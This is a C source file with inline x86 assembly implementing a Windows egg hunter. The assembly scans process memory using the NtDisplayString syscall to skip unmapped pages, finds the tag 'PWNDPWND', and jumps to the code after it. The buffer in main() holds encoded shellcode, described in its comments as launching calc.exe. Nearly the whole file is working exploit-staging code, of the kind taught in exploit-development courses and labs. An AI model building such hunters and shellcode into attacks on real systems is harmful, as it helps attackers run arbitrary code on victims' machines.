#include <stdio.h>

int _NtDisplayStringEggHunter () {

	// slightly modified from scape's original code found here: www.hick.org/~mmiller/shellcode/win32/egghunt_syscall.c
	__asm {
		entry:
		loop_inc_page:
			or    dx, 0x0fff                    //loop through memory pages by adding 4095 decimal or PAGE_SIZE-1 to edx
		loop_inc_one:
            inc   edx                           //loop through addresses in the memory page one by one
				
        make_syscall:
			push  edx                           //push edx value (current address) onto the stack to save for future reference
			push  0x43                          //push 0x43 (the Syscall ID for NtDisplayString) onto the stack
			pop   eax                           //pop 0x43 into eax to use as the parameter to syscall
			int   0x2e                          //issue the interrupt to call NtDisplayString kernel function
			
		check_is_valid:
			cmp   al, 0x05                      //compare low order byte of eax to 0x5 
												//(which indicates an access violation from NtDisplayString)
			pop   edx                           //restore edx from the stack
            jz    loop_inc_page                 //if the zf flag was set by the cmp instruction there was an access violation
												//and the address was invalid so jmp back to or dx,0x0fff instruction
		is_egg:
            mov   eax, 0x444e5750               //if the address was valid, move the egg into eax for comparison
            mov   edi, edx                      //set edi to the current address pointer in edx for use in the scasd instruction
            scasd                               //compares value in eax to dword value addressed by edi (current address pointer)
												//and sets EFLAGS register accordingly
												//following scasd comparison, EDI is automatically incremented by 4 if DF flag is 0 
												//or decremented if DF flag is 1 
            jnz   loop_inc_one                  //egg not found? jump back to the inc edx instruction to increment pointer
            scasd                               //first 4 bytes of egg found; compare the dword in edi to eax again (which is now edx + 4)
											    //(remember scasd automatically advanced by 4)
            jnz   loop_inc_one                  //only the first half of the egg was found; jump back to the inc edx instruction to increment pointer  
 
        found:
			jmp   edi                           //egg found!; thanks to scasd, edi now points to shellcode
		}
}

int  main(){

	// variable declaration to load shellcode into memory 
	char shell[] =	"\x50\x57\x4e\x44\x50\x57\x4e\x44" // egg #1 = PWNDPWND
					// calc.exe shellcode ...
					"\xdb\xcf\xb8\x27\x17\x16\x1f\xd9\x74\x24\xf4\x5f\x2b\xc9"
					"\xb1\x33\x31\x47\x17\x83\xef\xfc\x03\x60\x04\xf4\xea\x92" 
					"\xc2\x71\x14\x6a\x13\xe2\x9c\x8f\x22\x30\xfa\xc4\x17\x84" 
					"\x88\x88\x9b\x6f\xdc\x38\x2f\x1d\xc9\x4f\x98\xa8\x2f\x7e" 
					"\x19\x1d\xf0\x2c\xd9\x3f\x8c\x2e\x0e\xe0\xad\xe1\x43\xe1"
					"\xea\x1f\xab\xb3\xa3\x54\x1e\x24\xc7\x28\xa3\x45\x07\x27" 
					"\x9b\x3d\x22\xf7\x68\xf4\x2d\x27\xc0\x83\x66\xdf\x6a\xcb" 
					"\x56\xde\xbf\x0f\xaa\xa9\xb4\xe4\x58\x28\x1d\x35\xa0\x1b"
					"\x61\x9a\x9f\x94\x6c\xe2\xd8\x12\x8f\x91\x12\x61\x32\xa2"
					"\xe0\x18\xe8\x27\xf5\xba\x7b\x9f\xdd\x3b\xaf\x46\x95\x37"
					"\x04\x0c\xf1\x5b\x9b\xc1\x89\x67\x10\xe4\x5d\xee\x62\xc3"
					"\x79\xab\x31\x6a\xdb\x11\x97\x93\x3b\xfd\x48\x36\x37\xef"
					"\x9d\x40\x1a\x65\x63\xc0\x20\xc0\x63\xda\x2a\x62\x0c\xeb"
					"\xa1\xed\x4b\xf4\x63\x4a\xa3\xbe\x2e\xfa\x2c\x67\xbb\xbf"
					"\x30\x98\x11\x83\x4c\x1b\x90\x7b\xab\x03\xd1\x7e\xf7\x83"
					"\x09\xf2\x68\x66\x2e\xa1\x89\xa3\x4d\x24\x1a\x2f\xbc\xc3"
					"\x9a\xca\xc0";

	_NtDisplayStringEggHunter ();
}